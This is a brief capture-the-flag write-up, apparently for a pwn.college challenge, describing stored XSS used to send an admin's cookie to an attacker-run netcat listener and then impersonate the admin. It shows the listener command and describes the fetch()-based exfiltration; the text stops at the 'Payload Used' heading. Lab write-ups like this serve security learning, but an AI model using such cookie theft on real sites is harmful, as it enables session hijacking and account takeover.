## 📝 WRITEUP: "XSS Cookie Stealer"

**Challenge Type:** Web security
**Technique:** Stored XSS → Cookie Theft → Admin Impersonation

---

### ✅ Exploitation Steps:

1. We are logged in as a normal user (`hacker`) and can submit posts via `/draft`.
2. These posts are rendered in `/`, including for the admin who views the site automatically.
3. The admin's session is authenticated via the cookie: `auth=admin|pwn.college{...}`.
4. We exploit a stored XSS by submitting a malicious `<script>` tag that runs in the admin's browser.
5. The JavaScript uses `fetch()` to exfiltrate `document.cookie` to our server.
6. We listen using a simple `netcat` command:

   ```bash
   nc -lvnp 8000
   ```
7. Once the admin visits `/`, our script runs and we receive the cookie.
8. Using the stolen cookie, we send authenticated requests and dump the flag.

### ✅ Payload Used
